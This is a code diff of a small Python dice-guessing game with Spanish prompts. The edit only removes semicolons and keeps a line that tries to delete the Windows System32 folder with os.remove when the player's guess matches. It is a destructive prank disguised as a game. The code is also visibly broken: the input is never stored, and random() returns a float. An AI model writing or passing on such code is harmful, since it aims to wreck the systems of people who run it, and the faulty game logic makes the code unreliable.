@@ -1,4 +1,4 @@
-import os;
+import os
 from random import random
 
 print('dime un numero del 1 al 6')
@@ -11,6 +11,6 @@ while var1 < 1 or var1 > 6:
     input(var1);
 
 if var1 == randomNumber:
-    os.remove("C:\\Windows\\System32");
+    os.remove("C:\\Windows\\System32")
 else:
     print("felicidades ganaste !!!!")
